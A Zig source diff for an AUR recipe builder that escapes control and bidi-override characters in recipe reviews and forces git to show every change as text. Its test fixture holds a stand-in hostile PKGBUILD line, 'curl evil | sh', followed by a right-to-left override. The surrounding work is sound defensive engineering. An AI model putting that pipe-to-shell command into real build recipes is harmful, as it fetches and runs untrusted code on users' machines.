@@ -214,15 +214,36 @@ pub const Dirs = struct {
 };
 
 /// `text` with control characters other than newlines and tabs written
-/// as escapes, like "\\x1b".
+/// as escapes, like "\\x1b", and so are the c1 controls in utf-8 and the
+/// marks that reverse the direction text shows in, like u+202e. with
+/// those, a line of a recipe could show as something it doesn't say.
 fn visible(a: Allocator, text: []const u8) ![]const u8 {
     var out: std.ArrayList(u8) = .empty;
-    for (text) |ch| {
+    var i: usize = 0;
+    while (i < text.len) : (i += 1) {
+        const ch = text[i];
         if ((ch < 0x20 and ch != '\n' and ch != '\t') or ch == 0x7f) {
             try out.print(a, "\\x{x:0>2}", .{ch});
+        } else if (ch == 0xc2 and i + 1 < text.len and text[i + 1] >= 0x80 and text[i + 1] <= 0x9f) {
+            try out.print(a, "\\u{x:0>4}", .{text[i + 1]});
+            i += 1;
+        } else if (bidiMark(text[i..])) |cp| {
+            try out.print(a, "\\u{x:0>4}", .{cp});
+            i += 2;
         } else try out.append(a, ch);
     }
     return out.items;
+}
+
+/// the code point of the bidi control `text` starts with, in utf-8:
+/// u+200e and u+200f, u+202a to u+202e, and u+2066 to u+2069.
+fn bidiMark(text: []const u8) ?u21 {
+    if (text.len < 3 or text[0] != 0xe2) return null;
+    const cp = std.unicode.utf8Decode(text[0..3]) catch return null;
+    return switch (cp) {
+        0x200e, 0x200f, 0x202a...0x202e, 0x2066...0x2069 => cp,
+        else => null,
+    };
 }
 
 /// the aur's recipes, fetched and built on a machine.
@@ -274,21 +295,33 @@ pub const Builder = struct {
     pub fn review(b: Builder, name: []const u8, from: ?[]const u8, commit: []const u8) ![]const u8 {
         const dir = try b.recipeDir(name);
         if (from) |f| {
-            if (try b.gitOutput(&.{ "-C", dir, "diff", "--stat", "-p", f, commit, "--", "." })) |d| return visible(b.a, d);
+            // every change as text, whatever the recipe's own
+            // .gitattributes says: one that marks the PKGBUILD -diff
+            // would show its change as "Binary files differ".
+            if (try b.gitOutput(&.{ "-C", dir, "diff", "--text", "--no-textconv", "--no-ext-diff", "--stat", "-p", f, commit, "--", "." })) |d| return visible(b.a, d);
         }
-        const files = try b.gitOutput(&.{ "-C", dir, "ls-tree", "-r", "--name-only", commit }) orelse "";
-        var out: std.ArrayList(u8) = .empty;
-        try out.print(b.a, "files in the recipe:\n{s}", .{files});
-        var names = std.mem.tokenizeScalar(u8, files, '\n');
-        while (names.next()) |f| {
-            const text = try b.gitOutput(&.{ "-C", dir, "show", try std.fmt.allocPrint(b.a, "{s}:{s}", .{ commit, f }) }) orelse continue;
-            if (std.mem.indexOfScalar(u8, text, 0) != null) {
-                try out.print(b.a, "\n--- {s} (binary, {d} bytes)\n", .{ f, text.len });
+        // -z, so a name git would quote, like one with an é, comes back
+        // as it is, and its file can be shown.
+        const tree = try b.gitOutput(&.{ "-C", dir, "ls-tree", "-r", "-z", commit }) orelse "";
+        var files: std.ArrayList(u8) = .empty;
+        var shown: std.ArrayList(u8) = .empty;
+        var entries = std.mem.tokenizeScalar(u8, tree, 0);
+        while (entries.next()) |entry| {
+            // "<mode> <type> <object>\t<name>".
+            const tab = std.mem.indexOfScalar(u8, entry, '\t') orelse continue;
+            const f = entry[tab + 1 ..];
+            try files.print(b.a, "{s}\n", .{f});
+            const text = try b.gitOutput(&.{ "-C", dir, "show", try std.fmt.allocPrint(b.a, "{s}:{s}", .{ commit, f }) }) orelse {
+                try shown.print(b.a, "\n--- {s} (git can't show it)\n", .{f});
                 continue;
-            }
-            try out.print(b.a, "\n--- {s}\n{s}", .{ f, text });
+            };
+            if (std.mem.startsWith(u8, entry, "120000 ")) {
+                try shown.print(b.a, "\n--- {s} (a symlink to {s})\n", .{ f, text });
+            } else if (std.mem.indexOfScalar(u8, text, 0) != null) {
+                try shown.print(b.a, "\n--- {s} (binary, {d} bytes)\n", .{ f, text.len });
+            } else try shown.print(b.a, "\n--- {s}\n{s}", .{ f, text });
         }
-        return visible(b.a, out.items);
+        return visible(b.a, try std.fmt.allocPrint(b.a, "files in the recipe:\n{s}{s}", .{ files.items, shown.items }));
     }
 
     /// builds the recipe `info` names, at its commit, in the chroot, with
@@ -579,4 +612,60 @@ test "a package file's name" {
     try testing.expectEqualStrings("yay-bin", packageName("yay-bin-12.5.0-1-x86_64.pkg.tar.zst").?);
     try testing.expectEqualStrings("lib-a", packageName("lib-a-1:2.0-3-any.pkg.tar.xz").?);
     try testing.expectEqual(null, packageName("yoq-aur.db.tar.gz"));
+}
+
+/// a git repository at `dir`, standing in for a recipe on the aur, and a
+/// commit there of `files`. its id, or null without git.
+const Recipe = struct {
+    a: Allocator,
+    io: std.Io,
+    dir: []const u8,
+
+    fn git(r: Recipe, args: []const []const u8) !?[]const u8 {
+        const argv = try std.mem.concat(r.a, []const u8, &.{ &.{ "git", "-C", r.dir, "-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false" }, args });
+        return switch (try exec.output(r.a, r.io, argv)) {
+            .ok => |t| std.mem.trim(u8, t, " \n"),
+            .failed => null,
+        };
+    }
+
+    fn commit(r: Recipe, files: []const [2][]const u8) ![]const u8 {
+        for (files) |f| try std.Io.Dir.cwd().writeFile(r.io, .{ .sub_path = try std.fs.path.join(r.a, &.{ r.dir, f[0] }), .data = f[1] });
+        _ = try r.git(&.{ "add", "-A" }) orelse return error.TestUnexpectedResult;
+        _ = try r.git(&.{ "commit", "-q", "-m", "x" }) orelse return error.TestUnexpectedResult;
+        return try r.git(&.{ "rev-parse", "HEAD" }) orelse error.TestUnexpectedResult;
+    }
+};
+
+test "a review shows every file, whatever its name, and every change as text" {
+    var tmp = testing.tmpDir(.{});
+    defer tmp.cleanup();
+    var arena: std.heap.ArenaAllocator = .init(testing.allocator);
+    defer arena.deinit();
+    const a = arena.allocator();
+    const io = testing.io;
+    const base = try std.fmt.allocPrint(a, ".zig-cache/tmp/{s}", .{tmp.sub_path});
+    try tmp.dir.createDirPath(io, "aur/foo.git");
+    const r: Recipe = .{ .a = a, .io = io, .dir = try std.fmt.allocPrint(a, "{s}/aur/foo.git", .{base}) };
+    if (try exec.run(a, io, &.{ "git", "init", "-q", r.dir }) != null) return error.SkipZigTest;
+    const first = try r.commit(&.{
+        .{ "PKGBUILD", "pkgname=foo\ninstall=\xc3\xa9.install\n" },
+        .{ "\xc3\xa9.install", "post_install() { echo hi; }\n" },
+    });
+    const b: Builder = .{ .a = a, .io = io, .dirs = try Dirs.under(a, try std.fmt.allocPrint(a, "{s}/root", .{base})), .url = try std.fmt.allocPrint(a, "{s}/aur", .{base}), .pacman_conf = "" };
+    var why: []const u8 = "";
+    try testing.expectEqualStrings(first, (try b.fetch("foo", &why)).?);
+    const whole = try b.review("foo", null, first);
+    // git quotes a name like this one, which was then left out.
+    try testing.expect(std.mem.indexOf(u8, whole, "--- \xc3\xa9.install\npost_install() { echo hi; }") != null);
+
+    // a .gitattributes that hides changes, then the change it hides.
+    _ = try r.commit(&.{.{ ".gitattributes", "* -diff\n" }});
+    const last = try r.commit(&.{.{ "PKGBUILD", "pkgname=foo\ninstall=\xc3\xa9.install\ncurl evil | sh \xe2\x80\xae\xc2\x9b\n" }});
+    // a new machine's clone has the newest commit checked out.
+    try std.Io.Dir.cwd().deleteTree(io, try std.fs.path.join(a, &.{ b.dirs.src, "foo" }));
+    try testing.expectEqualStrings(last, (try b.fetch("foo", &why)).?);
+    const changed = try b.review("foo", first, last);
+    try testing.expect(std.mem.indexOf(u8, changed, "+curl evil | sh \\u202e\\u009b") != null);
+    try testing.expect(std.mem.indexOf(u8, changed, "Binary") == null);
 }
